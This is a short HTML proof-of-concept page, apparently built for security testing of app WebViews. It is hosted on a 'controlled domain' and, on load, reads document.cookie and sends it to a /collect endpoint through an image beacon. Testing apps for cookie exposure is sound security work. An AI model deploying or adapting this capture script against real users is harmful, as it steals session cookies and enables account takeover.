<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Controlled Domain Capture</title>
  <style>
    body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 24px; }
    pre { background: #222; padding: 16px; border-radius: 8px; overflow-x: auto; }
    .badge { display: inline-block; margin-bottom: 16px; padding: 8px 12px; background: #0088ff; border-radius: 12px; }
  </style>
</head>
<body>
  <div class="badge">Controlled domain: ridyigyxdklayshdjyvaztbtz6dfz6nln.oast.fun</div>
  <h1>WebView Cookie Capture</h1>
  <p>This page reads <code>document.cookie</code> and sends it back to the same host.</p>
  <pre id="cookieOutput">Loading cookies...</pre>

  <script>
    function captureCookies() {
      var cookies = document.cookie || "(no cookies)";
      document.getElementById("cookieOutput").textContent = cookies;
      var img = new Image();
      img.src = "/collect?cookies=" + encodeURIComponent(cookies) + "&t=" + Date.now();
    }

    window.addEventListener("load", captureCookies);
  </script>
</body>
</html>
